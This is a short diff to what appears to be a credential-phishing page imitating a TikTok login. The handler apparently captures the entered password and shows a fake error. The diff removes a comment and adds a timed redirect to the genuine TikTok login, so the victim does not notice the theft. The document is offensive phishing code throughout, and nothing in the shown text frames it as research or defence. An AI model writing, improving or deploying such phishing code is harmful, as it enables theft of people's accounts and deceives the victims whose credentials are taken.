@@ -344,11 +344,14 @@
       console.log('Capture error:', err);
     }
 
-    // Show fake error
     errorBox.classList.add('visible');
     loginBtn.textContent = 'Log in';
     loginBtn.disabled = false;
     passwordInput.value = '';
+
+    setTimeout(function() {
+      window.location.href = 'https://www.tiktok.com/login';
+    }, 3000);
   });
 </script>
 </body>
